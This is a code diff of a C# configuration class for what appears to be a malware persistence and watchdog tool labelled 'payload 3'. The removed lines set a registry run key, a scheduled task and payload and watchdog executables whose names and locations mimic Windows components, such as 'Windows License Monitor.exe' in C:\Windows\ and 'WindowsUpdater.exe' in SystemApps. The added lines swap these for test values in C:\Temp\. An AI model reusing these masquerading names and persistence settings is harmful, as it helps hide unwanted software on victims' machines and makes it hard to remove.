@@ -11,11 +11,11 @@ public class Config // This is for payload 3
 
 
     public static string RunKeyName { get; private set; } = "Windows Service Initializer";
-    public static string ScheduledTaskName { get; private set; } = "Wireless Network Optimization";
+    public static string ScheduledTaskName { get; private set; } = "Wireless Extreme Disk Optimization";
 
 
-    public static string PayloadPath { get; private set; } = @"C:\Windows\"; // This will be created if it doesnt already exist
-    public static string PayloadName { get; private set; } = "Windows License Monitor.exe";
+    public static string PayloadPath { get; private set; } = @"C:\Temp\"; // This will be created if it doesnt already exist
+    public static string PayloadName { get; private set; } = "TestPayload.exe";
     public static string PayloadFullPath { get; private set; } = Path.Combine(PayloadPath, PayloadName);
 
 
@@ -27,8 +27,8 @@ public class Config // This is for payload 3
     public static string SecondaryWatchdogFullPath { get; private set; } = Path.Combine(SecondaryWatchdogPath, SecondaryWatchdogName);
 
 
-    public static string PrimaryWatchdogPath { get; private set; } = @"C:\Windows\SystemApps\"; // CRUCIAL: This is the foler you will be put both watchdogs and the payload into
-    public static string PrimaryWatchdogName { get; private set; } = "WindowsUpdater.exe";
+    public static string PrimaryWatchdogPath { get; private set; } = @"C:\Temp\"; // CRUCIAL: This is the foler you will be put both watchdogs and the payload into
+    public static string PrimaryWatchdogName { get; private set; } = "TestPayload.exe";
     public static string PrimaryWatchdogMutexName { get; private set; } = "PrimaryWDogBin3";
     public static string PrimaryWatchdogFullPath { get; private set; } = Path.Combine(PrimaryWatchdogPath, PrimaryWatchdogName);
 }
